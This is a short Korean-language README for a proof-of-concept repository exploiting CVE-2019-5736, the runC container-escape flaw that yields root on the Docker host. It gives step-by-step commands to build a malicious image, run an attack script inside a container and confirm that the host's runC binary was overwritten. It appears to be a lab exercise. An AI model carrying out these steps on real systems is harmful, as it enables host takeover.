# CVE-2019-5736
해당 취약점은 runC의 파일 디스크립터(/proc/self/exe)를 적절하게 처리하지 못해 발생하며, 최종적으로 권한 상승이 일어나 컨테이너를 실행하는 호스트에 대한 루트 권한을 탈취하는 취약점입니다.


## Running the PoC
실습 환경에 맞게 stage2.c 수정할 것!  <br/><br/>

clone the repository:
```sh
$ git clone https://github.com/gleaming0/PoC_CVE-2019-5736
```
 
<br/>

- runC 바이너리 백업해두기
```sh
$ cp /usr/bin/docker-runc /usr/bin/docker-runc.bak
```

- 악성 이미지 설치 및 컨테이너 실행
```sh
$ docker build -t cve .
$ docker exec -it cvetest /bin/bash
```

- 컨테이너 안에서 run.sh 실행
```sh
$ cd /root && ./run.sh && exit
```

- 다시 컨테이너 실행 시 공격 성공!
```sh
$ docker exec -it cvetest /bin/bash
```  
<br/>

- 변조된 runC 확인
```sh
$ tail -c100 /usr/bin/docker-runc.bak | xxd
$ tail -c100 /usr/bin/docker-runc | xxd
```
![check runC](https://user-images.githubusercontent.com/76648555/162605543-28021bb8-7b67-4f05-9a36-c421e7dc27f8.jpg)
